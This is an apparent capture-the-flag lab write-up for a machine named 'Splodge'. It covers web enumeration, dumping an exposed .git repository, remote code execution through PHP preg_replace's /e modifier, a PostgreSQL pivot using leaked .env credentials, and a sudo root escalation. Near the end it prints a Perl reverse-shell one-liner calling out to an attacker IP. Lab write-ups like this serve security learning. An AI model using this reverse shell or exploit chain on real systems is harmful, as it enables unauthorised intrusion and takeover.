# Splodge

Splodge

Monday, June 13, 2022

3:22 PM

Nmap scan:

!\[\[55\_Splodge\_image001.png]]

&#x20;

!\[\[55\_Splodge\_image002.png]]

&#x20;

!\[\[55\_Splodge\_image003.png]]

&#x20;

Port 80:

!\[\[55\_Splodge\_image004.png]]

Gobuster scan:

!\[\[55\_Splodge\_image005.png]]

&#x20;

!\[\[55\_Splodge\_image006.png]]

&#x20;

All directories are inaccessible, but there's a .git directory.

!\[\[55\_Splodge\_image007.png]]

&#x20;

We also can't download this.

&#x20;

&#x20;

Port 1337:

!\[\[55\_Splodge\_image008.png]]

&#x20;

This seems to be some form of RCE thing.

Running a command works and outputs command line stuff.

!\[\[55\_Splodge\_image009.png]]

&#x20;

When inputting some illegal command, we get this:

!\[\[55\_Splodge\_image0010.png]]

&#x20;

So there's a basic WAF that only allows these commands to be run.

&#x20;

Port 8080:

!\[\[55\_Splodge\_image0011.png]]

&#x20;

There's an admin page for this website with no known passwords. Trying weak credentials or basic SQLI does not work here.

!\[\[55\_Splodge\_image0012.png]]

&#x20;

Burpsuite requests:

When viewing the requests made within Burpsuote, we can see how there are some tokens with PHP/5.6.40 being used here, which is an outdated version of PHP.

!\[\[55\_Splodge\_image0013.png]]

&#x20;

The cookie is quite useless:

!\[\[55\_Splodge\_image0014.png]]

&#x20;

&#x20;

However, it's good to know that there is Laravel and PHP being used here.

&#x20;

/.git:

When looking around the /.git directory, we can see that there is indeed some kind of files there.

!\[\[55\_Splodge\_image0015.png]]

&#x20;

We should try to gain some git repository so we have some source code to look at.

We can download git-dumper from here to download all the files that we want.

[https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)

!\[\[55\_Splodge\_image0016.png]]

&#x20;

!\[\[55\_Splodge\_image0017.png]]

&#x20;

We can find a password here.

With that, we can login on port 8080.

!\[\[55\_Splodge\_image0018.png]]

&#x20;

There's this profanity filter regex and profanity replacement, as well as requiring us to use the admin password to update stuff.

Let's take a look at the source code from the git repository.

{width="5.552083333333333in" height="0.75in"}

&#x20;

Within PostController.php, there are lines of code there that would filter out certain things.

!\[\[55\_Splodge\_image0020.png]]

&#x20;

{width="8.90625in" height="2.0104166666666665in"}

&#x20;

There's this preg\_replace function that seems to edit the message, and after wards, we can see how the message is then passed somewhere else.

&#x20;

Preg\_Replace:

!\[\[55\_Splodge\_image0022.png]]

&#x20;

So basically, there are also some options to this function, such as using the 'e' modifier.

When googling for RCE related to this one function, there seems to be some.

!\[\[55\_Splodge\_image0023.png]]

&#x20;

This person abused the /e option to execute some code.

So we can do the same.

!\[\[55\_Splodge\_image0024.png]]

&#x20;

Then, we just need to send some text with the letter a and it will replace it with our shell there.

{width="9.84375in" height="2.0729166666666665in"}

&#x20;

!\[\[55\_Splodge\_image0026.png]]

&#x20;

This is what happens when we submit a comment with the letter a.

Now, we can gain a reverse shell.

&#x20;

Shell:

&#x20;

!\[\[55\_Splodge\_image0027.png]]

&#x20;

!\[\[55\_Splodge\_image0028.png]]

&#x20;

We can enter a comment and we would get this response.

!\[\[55\_Splodge\_image0029.png]]

&#x20;

{width="5.96875in" height="1.28125in"}

&#x20;

We can fix the PATH of this user

!\[\[55\_Splodge\_image0031.png]]

&#x20;

Flag:

!\[\[55\_Splodge\_image0032.png]]

&#x20;

PE:

TTY Shell:

!\[\[55\_Splodge\_image0033.png]]

&#x20;

!\[\[55\_Splodge\_image0034.png]]

&#x20;

Interesting output:

!\[\[55\_Splodge\_image0035.png]]

&#x20;

There is a port 25 listening on the inside of this machine.

That was rather interesting.

Going back to the Nmap scan, we can remember that there was PostGresSQL located within the machine.

A check on LinPeas reveals that the user called thesplodge is running it.

!\[\[55\_Splodge\_image0036.png]]

&#x20;

We could potentially gain RCE as this user if we can abuse PostGres.

We can read the files of the .env file located in the directory we spawned in, which is in /usr/share/nginx/html. The env files contains the credentials that we need for exploitation.

!\[\[55\_Splodge\_image0037.png]]

&#x20;

!\[\[55\_Splodge\_image0038.png]]

&#x20;

We can gain RCE through this.

!\[\[55\_Splodge\_image0039.png]]

&#x20;

We can get a reverse shell using this:

!\[\[55\_Splodge\_image0040.png]]

'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.109:8080");STDIN->fdopen($c,r);$\~->fdopen($c,w);system$\_ while<>;''';

&#x20;

{width="6.96875in" height="1.6145833333333333in"}

&#x20;

PE2:

!\[\[55\_Splodge\_image0042.png]]

Checking sudo privileges, we can just get root instantly and easily.

&#x20;

!\[\[55\_Splodge\_image0043.png]]

&#x20;

Flag:

!\[\[55\_Splodge\_image0044.png]]

b4c0e752c072b1f47930e13b1bbe6f76
